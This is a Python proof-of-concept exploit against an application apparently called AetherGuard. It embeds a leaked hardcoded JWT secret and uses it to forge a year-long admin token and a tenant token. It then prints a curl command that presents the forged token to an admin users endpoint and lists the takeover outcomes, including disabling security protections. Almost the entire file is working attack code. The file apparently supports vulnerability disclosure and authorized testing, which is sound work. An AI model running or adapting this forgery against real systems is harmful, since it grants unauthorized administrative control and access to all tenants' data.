#!/usr/bin/env python3
"""
AetherGuard JWT Token Forgery - Proof of Concept
================================================

This script demonstrates the critical security vulnerability where
JWT_SECRET is hardcoded in the source code, allowing attackers to
forge arbitrary tokens.

VULNERABILITY: Hardcoded JWT_SECRET in backend/.env
JWT_SECRET=supersecretjwtkeythatisatleast32charslong

DISCLAIMER: For authorized security testing only!
"""

import jwt
import datetime
import sys
import os

# The leaked JWT_SECRET from backend/.env
JWT_SECRET = "supersecretjwtkeythatisatleast32charslong"

def generate_admin_token():
    """Generate a forged admin token"""
    
    # Create payload with admin privileges
    payload = {
        "userId": "admin-uuid-12345",
        "email": "admin@aetherguard.local",
        "username": "admin",
        "role": "admin",           # Highest privilege
        "plan": "ultra",
        "tenantId": "master",
        "iat": int(datetime.datetime.now().timestamp()),
        "exp": int((datetime.datetime.now() + datetime.timedelta(days=365)).timestamp())
    }
    
    # Sign the token with the leaked secret
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
    
    return token


def generate_tenant_token(tenant_id: str, email: str):
    """Generate a forged tenant token"""
    
    payload = {
        "userId": f"user-{tenant_id}",
        "email": email,
        "username": email.split('@')[0],
        "role": "tenant",
        "plan": "ultra",
        "tenantId": tenant_id,
        "iat": int(datetime.datetime.now().timestamp()),
        "exp": int((datetime.datetime.now() + datetime.timedelta(days=30)).timestamp())
    }
    
    token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
    return token


def verify_token(token: str):
    """Verify a token using the leaked secret"""
    try:
        decoded = jwt.decode(token, JWT_SECRET, algorithms=["HS256"])
        return decoded
    except jwt.InvalidSignatureError:
        return None
    except jwt.ExpiredSignatureError:
        return None


def main():
    print("=" * 60)
    print("AetherGuard JWT Token Forgery - Proof of Concept")
    print("=" * 60)
    print()
    
    print(f"[+] Leaked JWT_SECRET: {JWT_SECRET}")
    print()
    
    # Generate admin token
    print("[*] Generating forged admin token...")
    admin_token = generate_admin_token()
    print(f"[+] Admin Token:\n{admin_token}")
    print()
    
    # Verify it
    print("[*] Verifying forged token...")
    decoded = verify_token(admin_token)
    if decoded:
        print("[+] Token verification SUCCESSFUL!")
        print(f"    Decoded payload:")
        for key, value in decoded.items():
            print(f"      {key}: {value}")
    else:
        print("[-] Token verification FAILED!")
    
    print()
    print("-" * 60)
    print()
    
    # Generate tenant token
    print("[*] Generating forged tenant token...")
    tenant_token = generate_tenant_token("tenant-999", "attacker@evil.com")
    print(f"[+] Tenant Token:\n{tenant_token}")
    print()
    
    # Demonstrate use
    print("=" * 60)
    print("USE CASE: Full System Compromise")
    print("=" * 60)
    print()
    print("With this admin token, an attacker can:")
    print("  1. Access all admin API endpoints")
    print("  2. Create/delete API keys")
    print("  3. Manage users and roles")
    print("  4. Access all tenant data")
    print("  5. Control security agents")
    print("  6. Disable security protections")
    print()
    print("Example curl command:")
    print(f'''curl -X GET http://target:3005/api/admin/users \\
  -H "Authorization: Bearer {admin_token}"''')
    print()


if __name__ == "__main__":
    main()
